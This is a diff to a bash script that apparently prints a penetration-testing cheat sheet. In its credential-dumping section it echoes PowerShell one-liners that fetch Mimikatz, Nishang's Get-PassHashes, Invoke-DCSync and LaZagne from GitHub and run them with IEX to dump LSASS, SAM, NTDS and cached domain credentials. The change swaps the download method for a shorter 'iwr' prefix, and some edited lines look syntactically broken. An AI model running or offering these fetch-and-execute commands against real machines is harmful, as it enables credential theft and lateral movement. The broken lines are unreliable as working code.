@@ -25,6 +25,9 @@ NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
 PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 
+iwr="IEX (iwr -usebasicparsing "
+DownloadMethod=""
+
 
 # Wordlists
 UserList="'/usr/share/seclists/Usernames/Names/names.txt'"
@@ -474,19 +477,20 @@ echo -e ""
 echo -e "${LGREEN}Credential Dumping${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}LSASS Memory${RESTORE}"
-echo -e "IEX (New-Object Net.WebClient).DownloadString("$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"
+echo -e "$iwr "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"
 echo -e ""
 echo -e "${IBLUE}SAM${RESTORE}"
-echo -e "IEX (New-Object Net.WebClient).DownloadString('$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
+echo -e "$iwr '$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
 echo -e ""
 echo -e "${IBLUE}NTDS${RESTORE}"
-echo -n -e "IEX (New-Object Net.WebClient).DownloadString('$PentestFactoryRepo""/Invoke-DCSync.ps1');Invoke-DCSync";echo -e " ${YELLOW}# WIP${RESTORE}"
+echo -n -e "$iwr $PentestFactoryRepo""/Invoke-DCSync.ps1');Invoke-DCSync";echo -e " ${YELLOW}# WIP${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}NTDS${RESTORE}"
 echo -e "${YELLOW}# WIP${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Cached Domain Credentials${RESTORE}"
-echo -e "IEX (New-Object Net.WebClient).DownloadString("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
+echo -e "$iwr "\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
+
 
 
 echo -e ""
